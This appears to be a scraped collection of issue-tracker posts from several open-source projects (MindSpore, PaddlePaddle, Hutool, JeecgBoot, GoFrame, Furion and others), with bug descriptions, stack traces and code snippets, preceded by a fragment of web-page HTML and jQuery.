&lt;ul&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm6/"" title=""产品分类六""&gt;&lt;img src=""/static/upload/image/20220421/1650531291812755.jpg"" alt=""产品分类六"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; &lt;ul&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; $(function () { $("".pro .plist"").eq(0).show().siblings().hide(); $("".pro .menu li"").hover(function () { $(this).addClass(""cur"").siblings().removeClass(""cur""); var p = $(this).index(); $("".pro .plist"").eq(p).fadeIn().siblings().hide(); }) $('.menu li').first().addClass('cur') }) &lt;/script&gt; &lt;/div&gt;"
"[ST][MS][NET][wide&deep dynamic shape][910 8p]The operator UnsortedSegmentSum-op1026's input2's value depend is optional, but its input node is a CNode, not a value node","wide&amp;deep dynamic shape网络在910 8p训练，训练日志有error日志，但不影响网络训练 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:fe4ae5481cb -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220714 MindSpore 版本：编译时间20220716160710 r1.8.0 commit_id:fe4ae5481cb (/): /mode graph test_ms_model_zoo_wide_deep_criteo_dynamic_shape_train_infer_8p.py cd solution_test/remaining/test_scriptes/mindspore/net/wide_deep/network python -m nose -s --nologcapture test_ms_model_zoo_wide_deep_criteo_dynamic_shape_train_infer_8p.py 网络训练成功，训练日志正常 走给刘步宇   <code>: [ERROR] KERNEL(71309,ffffb22c3480,python):2022-07-18-11:07:33.794.515 [mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_json/tbe_json_creator.cc:546] GenInputConstValue] The operator Gradients/Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/gradGather/UnsortedSegmentSum-op898's input1's value depend is optional, but its input node is a CNode, not a value node."
demo运行登录报错An Authentication object was not found in the SecurityContext,git下来的代码，运行起来后，登录admin并Authorize，提示如下： 请问是什么原因引起的呢   <code>: This XML file does not appear to have any style information associated with it. The document tree is shown below. &lt;oauth&gt; &lt;error_description&gt; An Authentication object was not found in the SecurityContext &lt;/error_description&gt; &lt;error&gt;unauthorized&lt;/error&gt; &lt;/oauth&gt;
Incremental Learning Support for Fluid with Distribution,"Incremental Learning Supported: At current, Trainer will run at the end of a train. But, when we run PaddlePaddle with distribution, there are two problems need to be solved: ** there are multi trainers, they will all save a model in , but there is no need for that. the parameter server will not run , but it needs to load model at startup. ** The solution is same as #10376:Need add flatten op The different with is: must be called by manual. only save models variables, do not need to save other things. do not delete files be saved.   <code>: save_model param_path save_model checkpoint save_model save_model save_model"
能否在创建时指定列名？,"在导出时，使用的特性或者属性名作为列名，有时候需要根据数据来动态拼接数据，这时候需要指定列名，请问由这方面的实现吗？或者有这样的开发计划吗？ 可能我没有表达好，就是在导出时给定数据源，再给定列名，已给定的列名导出 不需要AAA和BBB作为列名，而是传递一个变量作为列名   <code>: MiniExcel.SaveAs(path, new[] { new {AAA = ""MiniExcel"", BBB = 1}, new {AAA = ""Github"", BBB = 2} });"
httpUtil工具类toParams方法取消转义失败,"JDK版本： openjdk_8_201 hutool版本： 5.7.16 2.问题点 无论是true还是false 都是会进行转义 该方法在 5.7.13 版本是正常的   <code>: Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""name"",""张三""); map.put(""age"",""18""); System.out.println(HttpUtil.toParams(map, CharsetUtil.CHARSET_UTF_8,false)); System.out.println(HttpUtil.toParams(map, CharsetUtil.CHARSET_UTF_8,true)); //name=%E5%BC%A0%E4%B8%89&amp;age=18 //name=%E5%BC%A0%E4%B8%89&amp;age=18"
消除目前导入后几处警告,修改三处POM文件 问题描述： When using @ConfigurationProperties it is recommended to add 'spring-boot-configuration-processor' to your classpath to generate configuration metadata 修改文件： 1、ruoyi-admin/pom.xml 2、ruoyi-framework/pom.xml 3、ruoyi-generator/pom.xml 添加内容具体如下: 修改Swagger2不建议警告 ? Class 'springfox.documentation.swagger.web.ClassOrApiAnnotationResourceGroup 修改文件: 具体内容:   <code>: &lt;!-- spring-boot-configuration-processor --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;swagger.version&gt;2.9.2&lt;/swagger.version&gt;
Online代码功能，跨库数据库同步时报错（单库正常）：org.jeecg.modules.online.cgform.c.a:492,"版本号： 3.2.0 我的环境是微服务、多租户、SAAS模式下，系统库为主库（jeecg-boot），业务库为单独的模块（包含在jeecg-boot-parent内）并设置了单独数据库(com),更改表单生成来源为com库【导入正常、生成的应用正常，但更改表结构同步时出错】。 跨数据库生成代码时出现此错误，在一个库中是正常的。   <code>: 2022-05-07 17:25:50.011 [scheduling-1] INFO org.jeecg.modules.test.lock.DemoLockTest:41 - ========执行 分布式锁 业务逻辑1============= 2022-05-07 17:25:50.012 [scheduling-1] INFO org.jeecg.modules.test.lock.DemoLockTest:49 - execute任务结束，休眠十秒完成，当前系统时间戳（秒）：1651915550 2022-05-07 17:25:50.017 [scheduling-1] INFO o.j.b.starter.lock.aspect.DistributedLockHandler:83 - 结束RedisLock环绕通知... 2022-05-07 17:25:55.002 [scheduling-1] INFO o.j.b.starter.lock.aspect.DistributedLockHandler:55 - 进入RedisLock环绕通知... 2022-05-07 17:25:55.007 [scheduling-1] INFO org.jeecg.modules.test.lock.DemoLockTest:39 - 执行execute任务开始，休眠十秒开始，当前系统时间戳（秒）：1651915555 2022-05-07 17:25:58.716 [http-nio-7001-exec-2] ERROR org.jeecg.modules.online.cgform.c.a:492 - Could not parse mapping document: null (INPUT_STREAM) org.hibernate.boot.InvalidMappingException: Could not parse mapping document: null (INPUT_STREAM) at org.hibernate.boot.jaxb.internal.InputStreamXmlSource.doBind(InputStreamXmlSource.java:46) at org.hibernate.boot.jaxb.internal.InputStreamXmlSource.doBind(InputStreamXmlSource.java:38) at org.hibernate.boot.spi.XmlMappingBinderAccess.bind(XmlMappingBinderAccess.java:94) at org.hibernate.boot.MetadataSources.addInputStream(MetadataSources.java:430) at org.jeecg.modules.online.config.c.d.a(DbTableProcess.java:134) at org.jeecg.modules.online.cgform.service.a.d.doDbSynch(OnlCgformHeadServiceImpl.java:454) at org.jeecg.modules.online.cgform.service.a.d$$FastClassBySpringCGLIB$$76271ae2.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at org.jeecg.modules.online.cgform.service.a.d$$EnhancerBySpringCGLIB$$a37e523b.doDbSynch(&lt;generated&gt;) at org.jeecg.modules.online.cgform.c.a.h(OnlCgformApiController.java:489) at org.jeecg.modules.online.cgform.c.a$$FastClassBySpringCGLIB$$b70991a.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at org.jeecg.modules.online.cgform.c.a$$EnhancerBySpringCGLIB$$21f48545.h(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.jeecg.common.config.mqtoken.TransmitUserTokenFilter.doFilter(TransmitUserTokenFilter.java:28) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:360) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:399) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:889) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1743) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: org.hibernate.boot.MappingException: Unable to perform unmarshalling at line number 7 and column 20. Message: cvc-complex-type.2.4.a: Invalid content was found starting with element 'property'. One of '{""http://www.hibernate.org/xsd/orm/hbm"":meta, ""http://www.hibernate.org/xsd/orm/hbm"":tuplizer, ""http://www.hibernate.org/xsd/orm/hbm"":subselect, ""http://www.hibernate.org/xsd/orm/hbm"":cache, ""http://www.hibernate.org/xsd/orm/hbm"":natural-id-cache, ""http://www.hibernate.org/xsd/orm/hbm"":synchronize, ""http://www.hibernate.org/xsd/orm/hbm"":comment, ""http://www.hibernate.org/xsd/orm/hbm"":id, ""http://www.hibernate.org/xsd/orm/hbm"":composite-id}' is expected. : origin(null) at org.hibernate.boot.jaxb.internal.AbstractBinder.jaxb(AbstractBinder.java:178) at org.hibernate.boot.jaxb.internal.MappingBinder.doBind(MappingBinder.java:53) at org.hibernate.boot.jaxb.internal.AbstractBinder.doBind(AbstractBinder.java:103) at org.hibernate.boot.jaxb.internal.AbstractBinder.bind(AbstractBinder.java:58) at org.hibernate.boot.jaxb.internal.InputStreamXmlSource.doBind(InputStreamXmlSource.java:43) ... 102 common frames omitted Caused by: javax.xml.bind.UnmarshalException: null at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.handleStreamException(UnmarshallerImpl.java:453) at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:433) at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:405) at org.hibernate.boot.jaxb.internal.AbstractBinder.jaxb(AbstractBinder.java:172) ... 106 common frames omitted Caused by: org.xml.sax.SAXParseException: cvc-complex-type.2.4.a: Invalid content was found starting with element 'property'. One of '{""http://www.hibernate.org/xsd/orm/hbm"":meta, ""http://www.hibernate.org/xsd/orm/hbm"":tuplizer, ""http://www.hibernate.org/xsd/orm/hbm"":subselect, ""http://www.hibernate.org/xsd/orm/hbm"":cache, ""http://www.hibernate.org/xsd/orm/hbm"":natural-id-cache, ""http://www.hibernate.org/xsd/orm/hbm"":synchronize, ""http://www.hibernate.org/xsd/orm/hbm"":comment, ""http://www.hibernate.org/xsd/orm/hbm"":id, ""http://www.hibernate.org/xsd/orm/hbm"":composite-id}' is expected. at org.apache.xerces.util.ErrorHandlerWrapper.createSAXParseException(Unknown Source) at org.apache.xerces.util.ErrorHandlerWrapper.error(Unknown Source) at org.apache.xerces.impl.XMLErrorReporter.reportError(Unknown Source) at org.apache.xerces.impl.XMLErrorReporter.reportError(Unknown Source) at org.apache.xerces.impl.XMLErrorReporter.reportError(Unknown Source) at org.apache.xerces.impl.xs.XMLSchemaValidator$XSIErrorReporter.reportError(Unknown Source) at org.apache.xerces.impl.xs.XMLSchemaValidator.reportSchemaError(Unknown Source) at org.apache.xerces.impl.xs.XMLSchemaValidator.handleStartElement(Unknown Source) at org.apache.xerces.impl.xs.XMLSchemaValidator.startElement(Unknown Source) at org.apache.xerces.jaxp.validation.ValidatorHandlerImpl.startElement(Unknown Source) at com.sun.xml.bind.v2.runtime.unmarshaller.ValidatingUnmarshaller.startElement(ValidatingUnmarshaller.java:71) at com.sun.xml.bind.v2.runtime.unmarshaller.InterningXmlVisitor.startElement(InterningXmlVisitor.java:45) at com.sun.xml.bind.v2.runtime.unmarshaller.StAXEventConnector.handleStartElement(StAXEventConnector.java:231) at com.sun.xml.bind.v2.runtime.unmarshaller.StAXEventConnector.bridge(StAXEventConnector.java:100) at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:430) ... 108 common frames omitted"
"添加静态资源（img,fronts等）会导致启动卡住不动，无法正常启动","如下代码，添加静态资源（img,fronts等）会导致启动卡住不动，无法正常启动 func main() { }   <code>: s := ghttp.GetServer() if os.Getenv(""GP1_ROOT_DIR"")=="""" { os.Setenv(""GP1_ROOT_DIR"",""C:/project/code/go_workspace/gospace/src/startup_issue_with_fronts"") } fmt.Println(""add static resources - started"") //s.AddStaticPath(""/css"", os.Getenv(""GP1_ROOT_DIR"")+""/css"") //s.AddStaticPath(""/js"", os.Getenv(""GP1_ROOT_DIR"")+""/js"") s.AddStaticPath(""/img"", os.Getenv(""GP1_ROOT_DIR"")+""/img"") s.AddStaticPath(""/fonts"", os.Getenv(""GP1_ROOT_DIR"")+""/fonts"") fmt.Println(""add static resources - completed"") s.BindHandler(""/contact.html"", func(r *ghttp.Request) { r.Response.Writeln(""Hello GF"") }) s.SetPort(8199) s.Run()"
SpringbootApp类信息更新,"目前jianmu项目网站和License更新后启动类厘米的信息同步更新。   <code>: @OpenAPIDefinition( info = @Info( title = ""建木自动化集成平台"", version = ""2.0"", description = ""建木自动化集成平台"", license = @License( name = ""Apache-2.0"", url = ""http://www.apache.org/licenses/LICENSE-2.0"" ) ), externalDocs = @ExternalDocumentation( description = ""建木项目地址"", url = ""https://gitee.com/jianmu_dev"" ) )"
AI Studio后台任务跑一半挂掉了,"” 1）PaddlePaddle版本：2.0rc 4）系统环境：AI Studio后台任务 回溯   <code>: Epoch 1/50 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/layers/utils.py:77: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working return (isinstance(seq, collections.Sequence) and /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/nn/layer/norm.py:637: UserWarning: When training, we now always track global mean and variance. ""When training, we now always track global mean and variance."") step 619/619 [==============================] - loss: 7.3876 - 15s/step save checkpoint at /home/aistudio/work/output/0 Eval begin... step 157/157 [==============================] - loss: 7.0366 - 15s/step Eval samples: 10000 Epoch 2/50 step 619/619 [==============================] - loss: 7.4104 - 15s/step save checkpoint at /home/aistudio/work/output/1 Eval begin... step 157/157 [==============================] - loss: 7.1302 - 14s/step Eval samples: 10000 Epoch 3/50 step 619/619 [==============================] - loss: 7.0325 - 15s/step save checkpoint at /home/aistudio/work/output/2 Eval begin... step 157/157 [==============================] - loss: 7.0113 - 14s/step Eval samples: 10000 Epoch 4/50 step 619/619 [==============================] - loss: 6.6897 - 15s/step save checkpoint at /home/aistudio/work/output/3 Eval begin... step 157/157 [==============================] - loss: 7.0423 - 15s/step Eval samples: 10000 Epoch 5/50 step 619/619 [==============================] - loss: 6.4737 - 15s/step save checkpoint at /home/aistudio/work/output/4 Eval begin... step 157/157 [==============================] - loss: 6.8552 - 14s/step Eval samples: 10000 Epoch 6/50 step 619/619 [==============================] - loss: 6.7646 - 17s/step save checkpoint at /home/aistudio/work/output/5 Eval begin... step 157/157 [==============================] - loss: 7.1019 - 14s/step Eval samples: 10000 Epoch 7/50 step 619/619 [==============================] - loss: 6.8838 - 17s/step save checkpoint at /home/aistudio/work/output/6 Eval begin... step 157/157 [==============================] - loss: 6.5195 - 15s/step Eval samples: 10000 Epoch 8/50 step 619/619 [==============================] - loss: 6.4819 - 14s/step save checkpoint at /home/aistudio/work/output/7 Eval begin... step 157/157 [==============================] - loss: 6.7995 - 14s/step Eval samples: 10000 Epoch 9/50 step 619/619 [==============================] - loss: 6.8385 - 14s/step save checkpoint at /home/aistudio/work/output/8 Eval begin... step 157/157 [==============================] - loss: 6.1501 - 14s/step Eval samples: 10000 Epoch 10/50 step 619/619 [==============================] - loss: 6.1990 - 16s/step save checkpoint at /home/aistudio/work/output/9 Eval begin... step 157/157 [==============================] - loss: 6.4901 - 14s/step Eval samples: 10000 Epoch 11/50 step 619/619 [==============================] - loss: 5.9624 - 16s/step save checkpoint at /home/aistudio/work/output/10 Eval begin... step 157/157 [==============================] - loss: 6.3731 - 14s/step Eval samples: 10000 Epoch 12/50 step 109/619 [====&gt;.........................] - loss: 6.4915 - ETA: 1:58:36 - 14s/step WARNING:root:DataLoader reader thread raised an exception. Exception in thread Thread-26: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 926, in _bootstrap_inner self.run() File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 323, in _thread_loop six.reraise(*sys.exc_info()) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/six.py"", line 703, in reraise raise value File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 293, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 52, in fetch data = [self.dataset[idx] for idx in batch_indices] File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 52, in &lt;listcomp&gt; data = [self.dataset[idx] for idx in batch_indices] File ""&lt;ipython-input-6-3c7598734fca&gt;"", line 45, in __getitem__ for line in f: OSError: [Errno 5] Input/output error ---------------------------------------------------------------------------EnforceNotMet Traceback (most recent call last)&lt;ipython-input-10-810a3f976afe&gt; in &lt;module&gt; 42 save_freq=1, 43 log_freq=1, ---&gt; 44 verbose=1) /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in fit(self, train_data, eval_data, batch_size, epochs, eval_freq, log_freq, save_dir, save_freq, verbose, drop_last, shuffle, num_workers, callbacks) 1467 1468 cbks.on_epoch_begin(epoch) -&gt; 1469 logs = self._run_one_epoch(train_loader, cbks, 'train') 1470 cbks.on_epoch_end(epoch, logs) 1471 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in _run_one_epoch(self, data_loader, callbacks, mode, logs) 1814 def _run_one_epoch(self, data_loader, callbacks, mode, logs={}): 1815 outputs = [] -&gt; 1816 for step, data in enumerate(data_loader): 1817 # data might come from different types of data_loader and have 1818 # different format, as following: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py in __next__(self) 339 try: 340 if in_dygraph_mode(): --&gt; 341 return self._reader.read_next_var_list() 342 else: 343 if self._return_list: EnforceNotMet: -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 std::thread::_State_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;ThreadPool::ThreadPool(unsigned long)::{lambda()#1}&gt; &gt; &gt;::_M_run() 1 std::__future_base::_State_baseV2::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*) 2 paddle::operators::reader::PyReader::ReadNext(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 3 paddle::operators::reader::BlockingQueue&lt;std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt; &gt;::Receive(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 4 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 5 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed_ != true, but received killed_:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154)"
"动态API中，一个方法返回Task<A.Root>,另一个方法返回Task<C.Root>时，swagger会报错","Furion 版本号 ---2.19.3 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp ---在A类中包含一个B类，在C类中包含一个D类 当B和D的名称相同时，比如都叫Root，那么在同一个动态API中，一个方法返回Task&lt;A.Root&gt;,另一个方法返回Task&lt;C.Root&gt;时，swagger会报错。 【更详细图片信息见优质服务群】 ---$RESTfulResult_Root"" for type ""$Furion.UnifyResult.RESTfulResult1[WeiXinWanDian.Core.Manager.Modeles.IBSDistanceModel+Root] 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: 1[WeiXinWanDian.Core.Manager.Modeles.IBSGeocoderModel+Root]"". The same schemaId is already used for type ""$Furion.UnifyResult.RESTfulResult"
如何自定义requestId,2.8X版本开始已经支持自定义requestId生成器了，具体文档参考自定义请求Id，大体步骤分为两步 第一步只需要要声明一个类，然后实现RequestIdGenerator接口即可： 第二步在LiteFlow的配置文件里声明下你这个类即可：   <code>: public class CustomRequestIdGenerator implements RequestIdGenerator { @Override public String generate() { return System.nanoTime(); } } liteflow.request-id-generator-class=com.yomahub.liteflow.test.requestId.config.CustomRequestIdGenerator
